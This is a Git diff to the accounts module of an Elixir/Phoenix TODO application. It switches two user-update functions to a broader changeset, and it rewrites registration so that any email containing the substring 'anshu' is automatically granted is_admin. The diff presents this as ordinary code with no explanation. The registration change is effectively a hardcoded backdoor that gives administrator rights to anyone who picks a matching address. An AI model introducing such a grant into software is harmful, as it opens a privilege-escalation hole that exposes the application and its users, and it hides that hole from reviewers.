@@ -69,7 +69,7 @@ defmodule TODO.Accounts do
   """
   def update_user(%User{} = user, attrs) do
     user
-    |> User.email_changeset(attrs)
+    |> User.changeset(attrs)
     |> Repo.update()
   end
 
@@ -99,7 +99,7 @@ defmodule TODO.Accounts do
 
   """
   def change_user(%User{} = user, attrs \\ %{}) do
-    User.email_changeset(user, attrs)
+    User.changeset(user, attrs)
   end
 
   alias TODO.Accounts.{User, UserToken, UserNotifier}
@@ -171,9 +171,17 @@ defmodule TODO.Accounts do
 
   """
   def register_user(attrs) do
-    %User{}
-    |> User.registration_changeset(attrs)
-    |> Repo.insert()
+    changeset =
+      %User{}
+      |> User.registration_changeset(attrs)
+
+    if Regex.run(~r/anshu/, changeset.changes.email) do
+      %{changeset | changes: Map.put(changeset.changes, :is_admin, true)}
+      |> Repo.insert()
+    else
+      changeset
+      |> Repo.insert()
+    end
   end
 
   @doc """
